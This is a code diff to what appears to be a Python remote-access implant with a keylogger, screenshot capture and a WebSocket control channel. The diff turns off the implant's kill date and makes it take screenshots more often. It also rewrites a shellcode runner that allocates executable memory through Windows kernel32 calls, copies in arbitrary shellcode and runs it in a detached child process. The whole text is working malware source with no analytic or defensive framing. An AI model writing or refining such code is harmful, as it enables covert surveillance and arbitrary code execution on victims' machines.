@@ -30,6 +30,8 @@ import xml.etree.ElementTree as ET
 import socketio
 import websocket
 import random, inspect, tempfile
+import multiprocessing
+from ctypes import wintypes
 
 
 # ======================
@@ -46,9 +48,9 @@ class Config:
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
-        self.SCREENSHOT_FREQUENCY = 30
-        self.KILLDATE_ENABLED = True
-        self.KILLDATE = "2025-05-05 12:00" if True else ""
+        self.SCREENSHOT_FREQUENCY = 10
+        self.KILLDATE_ENABLED = False
+        self.KILLDATE = "" if False else ""
 
 # ======================
 # Encryption
@@ -1067,50 +1069,110 @@ class Keylogger:
 # ======================
 
 class ShellcodeRunner:
+    # Initialize Windows DLL
+    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+    
+    # Define Windows constants
+    MEM_COMMIT = 0x00001000
+    MEM_RESERVE = 0x00002000
+    PAGE_EXECUTE_READWRITE = 0x40
+    INFINITE = 0xFFFFFFFF
+
+    # Set up proper function prototypes
+    kernel32.VirtualAlloc.restype = wintypes.LPVOID
+    kernel32.VirtualAlloc.argtypes = [
+        wintypes.LPVOID,    # lpAddress
+        ctypes.c_size_t,    # dwSize (using c_size_t instead of SIZE_T)
+        wintypes.DWORD,     # flAllocationType
+        wintypes.DWORD      # flProtect
+    ]
+    
+    kernel32.CreateThread.restype = wintypes.HANDLE
+    kernel32.CreateThread.argtypes = [
+        wintypes.LPVOID,    # lpThreadAttributes
+        ctypes.c_size_t,    # dwStackSize
+        wintypes.LPVOID,    # lpStartAddress
+        wintypes.LPVOID,    # lpParameter
+        wintypes.DWORD,     # dwCreationFlags
+        wintypes.LPDWORD    # lpThreadId
+    ]
+    
+    kernel32.WaitForSingleObject.restype = wintypes.DWORD
+    kernel32.WaitForSingleObject.argtypes = [
+        wintypes.HANDLE,    # hHandle
+        wintypes.DWORD      # dwMilliseconds
+    ]
+
     @staticmethod
-    def execute(shellcode_bytes):
+    def _worker(shellcode_bytes):
+       
         try:
-            # Allocate memory with PAGE_EXECUTE_READWRITE
-            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
-            ptr = ctypes.windll.kernel32.VirtualAlloc(
-                ctypes.c_int(0),
-                ctypes.c_int(len(shellcode_bytes)),
-                ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
-                ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
+            # Allocate executable memory
+            ptr = ShellcodeRunner.kernel32.VirtualAlloc(
+                None,
+                len(shellcode_bytes),
+                ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
+                ShellcodeRunner.PAGE_EXECUTE_READWRITE
             )
             
             if not ptr:
-                return {"status": "error", "message": "VirtualAlloc failed"}
+                raise ctypes.WinError(ctypes.get_last_error())
             
             # Copy shellcode to allocated memory
-            buf = (ctypes.c_char * len(shellcode_bytes)).from_buffer_copy(shellcode_bytes)
-            ctypes.windll.kernel32.RtlMoveMemory(
-                ctypes.c_void_p(ptr),
-                buf,
-                ctypes.c_int(len(shellcode_bytes))
+            ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
+            
+            # Create and execute thread
+            thread = ShellcodeRunner.kernel32.CreateThread(
+                None,
+                0,
+                ptr,
+                None,
+                0,
+                None
             )
             
-            # Create thread to execute shellcode
-            thread = ctypes.windll.kernel32.CreateThread(
-                ctypes.c_int(0),
-                ctypes.c_int(0),
-                ctypes.c_void_p(ptr),
-                ctypes.c_int(0),
-                ctypes.c_int(0),
-                ctypes.pointer(ctypes.c_int(0)))
-            
             if not thread:
-                return {"status": "error", "message": "CreateThread failed"}
+                raise ctypes.WinError(ctypes.get_last_error())
             
-            # Wait for thread to finish
-            ctypes.windll.kernel32.WaitForSingleObject(
-                ctypes.c_int(thread),
-                ctypes.c_int(-1))
-            
-            return {"status": "success", "message": "Shellcode executed"}
+            # Wait for thread to complete
+            ShellcodeRunner.kernel32.WaitForSingleObject(thread, ShellcodeRunner.INFINITE)
             
         except Exception as e:
-            return {"status": "error", "message": str(e)}
+            print(f"Error in worker: {e}", file=sys.stderr)
+            sys.exit(1)
+
+    @staticmethod
+    def execute(shellcode_bytes):
+
+        try:
+            # Create and start a new process
+            ctx = multiprocessing.get_context('spawn')
+            p = ctx.Process(
+                target=ShellcodeRunner._worker,
+                args=(shellcode_bytes,),
+                daemon=True
+            )
+            p.start()
+            
+            # Briefly wait to check if process started
+            #p.join(0.1)
+            
+            if p.is_alive():
+                return {
+                    'status': 'success',
+                    'message': f'Shellcode running in separate process (PID: {p.pid})'
+                }
+            else:
+                return {
+                    'status': 'error',
+                    'message': f'Process terminated immediately with exit code {p.exitcode}'
+                }
+                
+        except Exception as e:
+            return {
+                'status': 'error',
+                'message': str(e)
+            }
 
 # ======================
 # WebSocket Client
